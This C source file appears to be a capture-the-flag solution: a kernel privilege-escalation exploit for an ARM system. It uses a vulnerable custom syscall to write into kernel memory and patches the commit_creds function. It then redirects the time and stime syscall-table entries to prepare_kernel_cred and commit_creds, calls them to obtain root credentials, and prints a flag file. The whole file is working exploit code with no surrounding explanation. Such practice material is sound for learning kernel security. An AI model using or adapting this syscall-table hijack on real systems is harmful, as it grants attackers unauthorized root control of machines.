#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>

#define SYS_CALL_TABLE 0x8000e348
#define PREPARE_KERNEL_CRED 0x8003f924
#define COMMIT_CREDS 0x8003f560
#define MOV_R1_R1 "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1"

#define TIME_SYSCALL 13
#define STIME_SYSCALL 25
#define SYSCALL_OFFSET(n) n*4

// can't write: 0x0 and values between 0x61 and 0x7a
void write_kernel_memory(void* src, void* dst)
{
	syscall(223, src, dst);
}

void write_int_into_kernel(unsigned int data, void* dst)
{
	unsigned int src[2];
	src[0] = data;
	src[1] = 0;

	write_kernel_memory((void*)src, dst);
}

int main(int argc, char * argv[])
{
	write_kernel_memory(MOV_R1_R1, COMMIT_CREDS);
	write_int_into_kernel(PREPARE_KERNEL_CRED, SYS_CALL_TABLE+SYSCALL_OFFSET(TIME_SYSCALL));
	write_int_into_kernel(COMMIT_CREDS, SYS_CALL_TABLE+SYSCALL_OFFSET(STIME_SYSCALL));
	syscall(STIME_SYSCALL, syscall(TIME_SYSCALL, 0));
	system("cat ../root/flag");
	return 0;
}
